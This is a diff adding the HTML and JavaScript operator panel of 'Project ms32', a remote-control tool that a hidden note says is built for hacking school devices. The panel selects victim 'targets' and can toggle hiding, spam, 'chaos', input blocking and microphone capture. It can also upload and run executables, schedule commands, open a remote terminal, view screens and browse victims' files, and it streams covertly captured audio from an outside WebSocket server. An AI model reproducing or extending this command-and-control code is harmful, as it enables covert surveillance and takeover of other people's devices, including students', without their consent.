@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ms32</title>
+  <link href="https://fonts.googleapis.com/css2?family=Silkscreen&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/static/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+  <link rel="icon" href="/static/favicon.ico" type="image/x-icon">
+  <style>
+    .contact-links-container {
+      /* Positioning near site heading, top right corner */
+      position: absolute; 
+      top: 85%;
+      right: 35%; 
+      display: flex;
+      flex-direction: column; /* Horizontal layout */
+      gap: 15px;
+      z-index: 1000;
+    }
+    .contact-link-btn {
+      padding: 4px 8px; /* Reduced padding for a 'stripped' look */
+      /* Using the green color found in other elements */
+      background-color: #238636; 
+      color: white;
+      text-decoration: none;
+      border-radius: 4px; /* Slightly smaller radius */
+      font-family: 'Silkscreen', sans-serif;
+      font-size: 10px; /* Reduced font size */
+      border: 1px solid #1a5e2a;
+      /* Reduced shadow for 'stripped' look */
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2); 
+      transition: background-color 0.2s, transform 0.1s;
+      cursor: pointer;
+      text-align: center;
+      white-space: nowrap; /* Prevent wrapping in the strip format */
+    }
+    .contact-link-btn:hover {
+      background-color: #30a14e;
+      transform: translateY(-1px);
+    }
+  </style>
+</head>
+
+<body>
+  <div class="progress-bar-container" style="display:none;">
+    <div class="progress-bar" id="progress-bar"></div>
+  </div>
+
+  <header>
+    <h1 style="display:none;">ms32-sha2</h1>
+  </header>
+
+  <div style="display:none;">
+    About the website: ms32 is a website designed for hacking school devices. This website is made by some professional hackers 👽.
+    <br> NOTE: If you open this website, your device will also be hacked, so open at your own risk.
+    <br> insta: https://www.instagram.com/_shakti.ladke_?igsh=eDBzZnpncDZ3a2Nr
+    <br> kisi ka baap se nahi darte 👽
+  </div>
+
+  <h2 class="site-heading"><pre>               Project ms32</pre></h2>
+
+  <div class="contact-links-container">
+    <a href="https://discord.gg/ebnahV5N5G" class="contact-link-btn">Contact for any help (Discord Server)</a>
+    <a href="https://www.instagram.com/ms32_org/" class="contact-link-btn">Instagram Bio</a>
+  </div>
+
+  <div class="home" id="home">
+    <div class="container">
+      <form action="/edit" method="POST" id="message-form">
+        <textarea placeholder="Type something..." class="text" name="text"></textarea>
+        <button class="btn" type="submit">Send</button>
+      </form>
+
+      <form action="/url" method="POST" id="url-form">
+        <input type="url" class="text" name="url" placeholder="Enter URL" required>
+        <button class="btn" type="submit">Open</button>
+      </form>
+      <form action="/com-txt" method="POST" id="coms-form">
+        <input type="text" class="text" name="coms" placeholder="Enter coms text" required>
+        <button class="btn" type="submit">Send</button>
+      </form>
+    </div>
+
+    <div class="overlay-box" id="overlay-box">
+      <form action="/add-task" method="POST" id="task-form">
+        <textarea class="text" name="task" placeholder="Enter task description..." required></textarea>
+        <input type="datetime-local" class="datetime-input" name="task-datetime" required>
+        <div class="dropdown-container">
+          <label for="Dropdown1" style="color:#238636">Select Target</label>
+          <select id="Dropdown1" class="dropdown" name="user">
+            <option value="{{selected}}">{{selected}}</option>
+            {% for user in users %}
+              {% if user != selected %}
+                <option value="{{user}}">{{user}}</option>
+              {% endif %}
+            {% endfor %}
+          </select>
+        </div>
+        <button class="btn" type="submit">Add Task</button>
+      </form>
+    </div>
+
+    <div class="bottom-left-buttons">
+      <label for="file-input" class="choose-file-btn">Choose File</label>
+      <input type="file" id="file-input" class="file-input">
+      <button class="update-btn" id="update-btn">Update</button>
+    </div>
+
+    <div class="status" id="status" style="color:{{color}};">{{state}}</div>
+
+  <div class="left-side-container">
+    <div class="dropdown-container">
+      <label for="Dropdown" style="color:#238636">Select Target</label>
+      <select id="Dropdown" class="dropdown">
+        <option  id="option-{{selected}}" value="{{selected}}">{{selected}}</option>
+        {% for user in users %}
+          {% if user != selected %}
+            <option value="{{user}}" id="option-{{user}}">{{user}}</option>
+          {% endif %}
+        {% endfor %}
+      </select>
+
+    </div>
+      <div class="dropdown-container errcont">
+      <form id="errform">
+        <label for="Dropdown" style="color:#238636">Err no to deploy</label>
+        <input type="number" min="1" placeholder="Error num..." name="err" id="errinput"><br>
+        <button id="errbut" type="submit">Deploy error</button>
+      </form>
+    </div>
+</div>
+
+
+    <div class="right-toggle-buttons" id="right-toggle-buttons">
+      <button id="hide-toggle" style="background-color:{{hc}}">Hide: {{hs}}</button>
+      <button id="spam-toggle" style="background-color:{{sc}}">Spam: {{ss}}</button>
+      <button id="flip-toggle" style="background-color:{{fc}}">Chaos: {{fs}}</button>
+      <button id="share-toggle" style="background-color:{{shc}}">Share: {{shs}}</button>
+      <button id="IN-toggle" style="background-color:{{ic}}">IN_Block: {{is1}}</button>
+      <button id="mic-toggle" style="background-color:{{mc}}">Mic: {{ms}}</button>
+      <button id="com-toggle" style="background-color: {{cc}};">Coms : {{cs}}</button>
+    </div>
+
+
+    <div class="sidebar hidden" id="schedule-sidebar">
+      <div class="sidebar-header">Schedule Task</div>
+      <div class="sidebar-content">
+        {% for task in tasks["tasks"] %}
+        <div class="task-item">
+        <div class="task-item-content">
+          <div class="task-details">
+            <span><span class="green-label">Task:</span> {{task["cmd"]}}</span>
+            <span><span class="green-label">Execution At:</span> {{task["execution_time"]}}</span>
+            <span><span class="green-label">User:</span> {{task["user"]}}</span>
+          </div>
+          <form action="/delete-task" method="POST" class="task-actions">
+            <input type="hidden" name="task-id" value="{{ task['id'] }}">
+            <button class="delete-btn"><i class="fas fa-trash-alt"></i></button>
+          </form>
+        </div>
+      </div>
+
+        {% endfor %}
+      </div>
+      <div class="bottom-fixed">
+        <button class="btn schedule-btn" id="add">Schedule</button>
+      </div>
+    </div>
+    <div class="sidebar hidden" id="upload-sidebar">
+      <div class="sidebar-header">Upload Files</div>
+      <div class="sidebar-content">
+       <div class="card">
+          <h4>Audio</h4>
+          <form action="/upload-files" method="POST" enctype="multipart/form-data">
+            <label for="audio-upload" class="file-label">Choose Audio</label>
+            <input type="hidden" value="sounds" name="path">
+            <input type="file" id="audio-upload" class="file-input" name="file" required>
+            <button class="upload-btn" type="submit">Upload</button>
+          </form>
+      </div>
+
+       <div class="card">
+         <h4>Image</h4>
+          <form action="/upload-files" method="POST" enctype="multipart/form-data">
+            <label for="img-upload" class="file-label">Choose Image</label>
+            <input type="hidden" value="images" name="path">
+            <input type="file" id="img-upload" class="file-input" name="file" required>
+            <button class="upload-btn" type="submit">Upload</button>
+          </form>
+       </div>
+       <div class="card">
+         <h4>Video</h4>
+          <form action="/upload-files" method="POST" enctype="multipart/form-data">
+            <label for="vid-upload" class="file-label">Choose Video</label>
+            <input type="hidden" value="videos" name="path">
+            <input type="file" id="vid-upload" class="file-input" name="file" required>
+            <button class="upload-btn" type="submit">Upload</button>
+          </form>
+       </div>
+       <div class="card">
+         <h4>Exe</h4>
+          <form action="/upload-files" method="POST" enctype="multipart/form-data">
+            <label for="exe-upload" class="file-label">Choose Exe</label>
+            <input type="hidden" value="apps" name="path">
+            <input type="file" id="exe-upload" class="file-input" name="file" required>
+            <button class="upload-btn" type="submit">Upload</button>
+          </form>
+       </div>
+      </div>
+    </div>
+    <div class="sidebar hidden" id="exe-sidebar">
+      <div class="sidebar-header">Exe files</div>
+      <div class="sidebar-content">
+        <div class="audio-list">
+          {% for exe in exes %}
+          <div class="audio-item">
+            <span>{{exe}}</span>
+            <form action="/run-exe" method="POST" style="display:inline">
+              <input type="hidden" name="exe" value="{{ exe }}">
+              <button class="play-btn"><i class="fas fa-play"></i></button>
+            </form>
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+    </div>
+
+    <div class="sidebar hidden" id="audio-sidebar">
+      <div class="sidebar-header">Audio Files</div>
+      <div class="sidebar-content">
+        <div class="audio-list">
+          {% for file in files %}
+          <div class="audio-item">
+            <span>{{file}}</span>
+            <form action="/play" method="POST" style="display:inline">
+              <input type="hidden" name="audio" value="{{ file }}">
+              <button class="play-btn"><i class="fas fa-play"></i></button>
+            </form>
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+    </div>
+
+    <div id="img-sidebar" class="sidebar hidden">
+      <div class="sidebar-header">Image Files</div>
+      <div class="sidebar-content">
+        <div class="audio-list">
+          {% for img in images %}
+          <div class="audio-item" style="display: flex; align-items: center; gap: 10px;">
+            <img src="/static/images/{{ img }}" alt="Image" style="width: 50px; height: 50px; object-fit: cover; border-radius: 5px;">
+            <span>{{ img }}</span>
+            <form action="/img" method="POST" style="display:inline">
+              <input type="hidden" name="img" value="{{ img }}">
+              <button class="play-btn"><i class="fas fa-play"></i></button>
+            </form>
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+    </div>
+    <div id="vid-sidebar" class="sidebar hidden">
+      <div class="sidebar-header">Video Files</div>
+      <div class="sidebar-content">
+        <div class="audio-list">
+          {% for vid in videos %}
+          <div class="audio-item" style="display: flex; align-items: center; gap: 10px;">
+            <span>{{ vid }}</span>
+            <form action="/vid" method="POST" style="display:inline">
+              <input type="hidden" name="vid" value="{{ vid }}">
+              <button class="play-btn"><i class="fas fa-play"></i></button>
+            </form>
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+    </div>
+    <audio id="mic"></audio>
+    <div class="right-switcher">
+      <button id="audio-btn"><i class="fa fa-music"></i></button>
+      <button id="img-btn"><i class="fas fa-image"></i></button>
+      <button id="vid-btn"><i class="fas fa-video"></i></button>
+      <button id="exe-btn"><i class="fas fa-file"></i></button>
+      <button id="sch-btn"><i class="fas fa-sharp-duotone fa-solid fa-clipboard-list"></i></button>    
+      <button id="upload-btn"><i class="fas fa-upload"></i></button>
+      <button id="terminal-btn"><i class="fas fa-terminal"></i></button>
+      <button id="screen-btn"><i class="fas fa-tv"></i></button>
+      <button id="log-btn"><i class="fas fa-newspaper"></i></button>   
+      <button id="com-btn"><i class="fas fa-microphone"></i></button>
+      <button id="file-btn"><i class="fas fa-folder"></i></button>
+    </div>
+  </div>
+
+</body>
+<script>
+update();
+fetchButtonState();
+
+const audio_form = document.getElementById('audio-form');
+const audio = document.getElementById('audio-input');
+const updateBtn = document.getElementById('update-btn');
+const fileInput = document.getElementById('file-input');
+const dropdown = document.getElementById("Dropdown");
+const audioPlayer = document.getElementById("mic")
+let selectedUser = dropdown.value
+let mic = false
+let interval
+let time
+let isadded = false;
+let cmd;
+let state;
+const eventSource = new EventSource('/audio');
+let toggleState
+
+
+
+dropdown.addEventListener("change", () => {
+  user = dropdown.value 
+  fetch("/change-user", {
+    method: "POST",
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ user: user })
+  });
+  selectedUser = dropdown.value
+  fetchButtonState()
+  update()
+});
+const processorCode = `
+  class PCMPlayerProcessor extends AudioWorkletProcessor {
+      constructor() {
+          super();
+          this.buffer = [];
+          this.port.onmessage = (event) => {
+              const floatData = event.data;
+              this.buffer.push(...floatData);
+          };
+      }
+
+      process(inputs, outputs) {
+          const output = outputs[0];
+          const channel = output[0];
+
+          for (let i = 0; i < channel.length; i++) {
+              if (this.buffer.length > 0) {
+                  channel[i] = this.buffer.shift();
+              } else {
+                  channel[i] = 0.0; // fill silence
+              }
+          }
+
+          return true;
+      }
+  }
+
+  registerProcessor('pcm-player-processor', PCMPlayerProcessor);
+        `;
+async function initConnection() {
+    const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+    const audioCtx = new AudioContextClass({ sampleRate: 44100 });
+    console.log('AudioContext:', typeof AudioContext !== 'undefined');
+    console.log('audioCtx.audioWorklet:', typeof new AudioContext().audioWorklet !== 'undefined');
+
+    if (!audioCtx.audioWorklet) {
+        console.error("AudioWorklet not supported in this browser.");
+        return;
+    }
+
+    await audioCtx.audioWorklet.addModule('/static/pcm-player-processor.js');
+
+
+    const pcmNode = new AudioWorkletNode(audioCtx, 'pcm-player-processor');
+    pcmNode.connect(audioCtx.destination);
+
+    const ws = new WebSocket('wss://screenshare-server.onrender.com');
+    ws.binaryType = 'arraybuffer';
+
+    ws.onopen = () => {
+        console.log('WebSocket connected');
+        ws.send("audioviewer");
+    };
+
+    ws.onerror = (e) => console.error('WebSocket error', e);
+    ws.onclose = () => console.warn('WebSocket closed');
+
+    ws.onmessage = (event) => {
+        const pcmData = new Int16Array(event.data);
+        const float32Data = new Float32Array(pcmData.length);
+
+        for (let i = 0; i < pcmData.length; i++) {
+            float32Data[i] = pcmData[i] / 32768;
+        }
+
+        pcmNode.port.postMessage(float32Data);
+    };
+
+    await audioCtx.resume();
+    console.log("Audio started");
+}
+
+async function fetchButtonState() {
+  try {
+    const response = await fetch('/static/state.json');
+    const data1 = await response.json();
+    const data = data1[dropdown.value]
+    console.log(data)
+    toggleState = data
+    initializeToggleButton('hide-toggle', 'Hide', data.hideToggleState.state || 'off');
+    initializeToggleButton('spam-toggle', 'Spam', data.spamToggleState.state || 'off');
+    initializeToggleButton('flip-toggle', 'Chaos', data.flipToggleState.state || 'off');
+    initializeToggleButton('share-toggle', 'Share', data.shareToggleState.state || 'off');
+    initializeToggleButton('IN-toggle', 'IN_Block', data.INToggleState.state || 'off');
+    initializeToggleButton('mic-toggle', 'Mic', data.micToggleState.state || 'off');
+    initializeToggleButton('com-toggle', 'Coms', data.comsToggleState.state || 'off');
+    if(data.comsToggleState.state === "on"){
+      document.getElementById("coms-form").style.display = "flex"
+    }
+    else if (data.comsToggleState.state === "off"){
+      document.getElementById("coms-form").style.display = "none"
+    }
+    // if(data.micToggleState.state === "on"){
+    //   mic = true
+    //   initConnection()
+    // }
+    // else if(data.micToggleState.state === "off"){
+    //   mic = false
+    // }
+  } catch (error) {
+    console.error('Error fetching button state:', error);
+  }
+}
+
+function initializeToggleButton(buttonId, defaultText, initialState) {
+  const button = document.getElementById(buttonId);
+  const newButton = button.cloneNode(true);
+  button.replaceWith(newButton);
+
+  const updatedButton = document.getElementById(buttonId);
+  updatedButton.dataset.state = initialState;
+  updatedButton.style.backgroundColor = initialState === 'on' ? 'green' : 'red';
+  updatedButton.textContent = `${defaultText}: ${initialState === 'on' ? 'On' : 'Off'}`;
+
+  updatedButton.addEventListener('click', function () {
+    let cmd;
+    let state;
+
+    if (defaultText === "Hide") {
+      cmd = "hIdE";
+    } else if (defaultText === "Spam") {
+      cmd = "sPaM";
+    } else if (defaultText === "Chaos") {
+      cmd = "fLiP";
+    }else if (defaultText === "Share"){
+      cmd = "sHaRe"
+    }else if (defaultText === "IN_Block"){
+      cmd = "bLoCk"
+    }else if (defaultText === "Mic"){
+      cmd = "mIc"
+      mic = !mic
+      if(!mic){
+        mic = false
+      }else{
+        mic = true
+        initConnection()
+      }
+    }else if (defaultText == "Coms"){
+      cmd = "cOmS"
+        if(updatedButton.dataset.state === "on"){
+        document.getElementById("coms-form").style.display = "none"
+      }
+      else if (updatedButton.dataset.state === "off"){
+        document.getElementById("coms-form").style.display = "flex"
+    }
+    }
+
+    if (updatedButton.dataset.state === 'on') {
+      updatedButton.dataset.state = 'off';
+      updatedButton.style.backgroundColor = 'red';
+      updatedButton.textContent = `${defaultText}: Off`;
+      state = "off";
+    } else {
+      updatedButton.dataset.state = 'on';
+      updatedButton.style.backgroundColor = 'green';
+      updatedButton.textContent = `${defaultText}: On`;
+      state = "on";
+    }
+
+    fetch("/toggle", {
+      method: "POST",
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ cmd: cmd, state: state })
+    });
+  });
+}
+
+  
+
+document.querySelector(".schedule-btn").addEventListener("click", () => {
+  const taskForm = document.getElementById("overlay-box");
+  taskForm.style.display = taskForm.style.display === "none" || taskForm.style.display === "" ? "block" : "none";
+});
+
+
+
+updateBtn.addEventListener('click', function () {
+  const file = fileInput.files[0];
+  if (!file) {
+    alert("Please choose a file to upload.");
+    return;
+  }
+
+  const progressBarContainer = document.querySelector(".progress-bar-container");
+  const progressBar = document.getElementById("progress-bar");
+  progressBarContainer.style.display = "block";
+  progressBar.style.width = "0%";
+
+  const formData = new FormData();
+  formData.append('file', file);
+
+  const xhr = new XMLHttpRequest();
+  xhr.open('POST', '/update', true);
+  xhr.upload.addEventListener('progress', (event) => {
+    if (event.lengthComputable) {
+      const percentage = Math.round((event.loaded / event.total) * 100);
+      progressBar.style.width = `${percentage}%`;
+    }
+  });
+
+  xhr.onload = () => {
+    if (xhr.status === 200) {
+      const response = JSON.parse(xhr.responseText);
+      if (response.success) {
+        alert('File updated successfully!');
+        progressBarContainer.style.display = "none";
+      } else {
+        alert('File update failed!');
+      }
+    } else {
+      alert('An error occurred while uploading the file.');
+    }
+
+    progressBarContainer.style.display = "none";
+  };
+
+  xhr.onerror = () => {
+    alert('An error occurred during the upload.');
+    progressBarContainer.style.display = "none";
+  };
+
+  xhr.send(formData);
+});
+
+async function update() {
+  try {
+    const response = await fetch("/status", { method: "GET" });
+
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+
+    const data = await response.json();
+
+    const statusElement = document.getElementById("status");
+    console.log(data)
+    Object.entries(data).forEach(([user, status]) => {
+        const option = document.getElementById(`option-${user}`)
+        if (option) {
+          if(status){
+            if(option.textContent !== `🟢 ${user}`){
+              option.textContent = `🟢 ${user}`
+            }
+          }else if(!status){
+            if(option.textContent !== `🔴 ${user}`){
+              option.textContent = `🔴 ${user}`
+            }
+          }
+        }
+     });
+    if (data[selectedUser]) {
+      statusElement.style.color = "green";
+      statusElement.textContent = "Online";
+    } else if (!data[selectedUser]) {
+      statusElement.style.color = "red";
+      statusElement.textContent = "Offline";
+    } else {
+      statusElement.style.color = "orange";
+      statusElement.textContent = "Unknown Status";
+    }
+  } catch (error) {
+    console.error('Error in update function:', error);
+
+    const statusElement = document.getElementById("status");
+    statusElement.style.color = "orange";
+    statusElement.textContent = "Connection Error";
+  }
+}
+document.querySelector("#errform").addEventListener("submit",(e)=>{
+  e.preventDefault()
+  const no = document.getElementById("errinput").value
+  fetch("/cmd",{
+    method:"POST",
+    body:`err ${no}`
+  })
+  document.querySelector("#errform").reset()
+})
+setInterval(update, 1000);
+
+</script>
+  <script>
+    const audioBtn = document.getElementById("audio-btn");
+    const imgBtn = document.getElementById("img-btn");
+    const vidBtn = document.getElementById("vid-btn");
+    const schBtn = document.getElementById("sch-btn");
+    const exeBtn = document.getElementById("exe-btn");
+    const uploadBtn = document.getElementById("upload-btn");
+    const terminalBtn = document.getElementById("terminal-btn");
+    const screenBtn = document.getElementById("screen-btn");
+    const logBtn = document.getElementById("log-btn");
+    const comBtn = document.getElementById("com-btn");
+    const filebtn = document.getElementById("file-btn")
+    const audioSidebar = document.getElementById("audio-sidebar");
+    const imgSidebar = document.getElementById("img-sidebar");
+    const vidSidebar = document.getElementById("vid-sidebar");
+    const schSidebar = document.getElementById("schedule-sidebar");
+    const exeSidebar = document.getElementById("exe-sidebar");
+    const uploadSidebar = document.getElementById("upload-sidebar");
+    
+    function hideAllSidebars() {
+      audioSidebar.classList.add("hidden");
+      imgSidebar.classList.add("hidden");
+      vidSidebar.classList.add("hidden");
+      schSidebar.classList.add("hidden");
+      exeSidebar.classList.add("hidden");
+      uploadSidebar.classList.add("hidden");
+      audioBtn.classList.remove("active");
+      imgBtn.classList.remove("active");
+      vidBtn.classList.remove("active");
+      schBtn.classList.remove("active");
+      exeBtn.classList.remove("active");
+      uploadBtn.classList.remove("active");
+    }    
+    function control(sidebar,btn){
+     btn.addEventListener("click", () => {
+       if (sidebar.classList.contains("hidden")) {
+         hideAllSidebars();
+         sidebar.classList.remove("hidden");
+         btn.classList.add("active");
+         document.getElementById("right-toggle-buttons").style.right = "340px"
+       } else {
+         sidebar.classList.add("hidden");
+         btn.classList.remove("active");
+         document.getElementById("right-toggle-buttons").style.right = "60px"
+       }
+     });      
+    }
+
+    control(audioSidebar,audioBtn)
+    control(imgSidebar,imgBtn)
+    control(vidSidebar,vidBtn)
+    control(schSidebar,schBtn)
+    control(exeSidebar,exeBtn)
+    control(uploadSidebar,uploadBtn)
+    terminalBtn.addEventListener("click",()=>{
+      window.open("/terminal","_blank")
+    })
+    screenBtn.addEventListener("click", () => {
+      window.open("/screenshare", "_blank")
+    })
+    logBtn.addEventListener("click", () => {
+      window.open("/logs", "_blank")
+    })
+    comBtn.addEventListener("click", () => {
+      window.open("/com", "_blank")
+    })
+    filebtn.addEventListener("click",()=>{
+      window.open(`/filesystem/${document.getElementById("Dropdown").value}`,"_blank")
+    })
+  </script>
+</html>
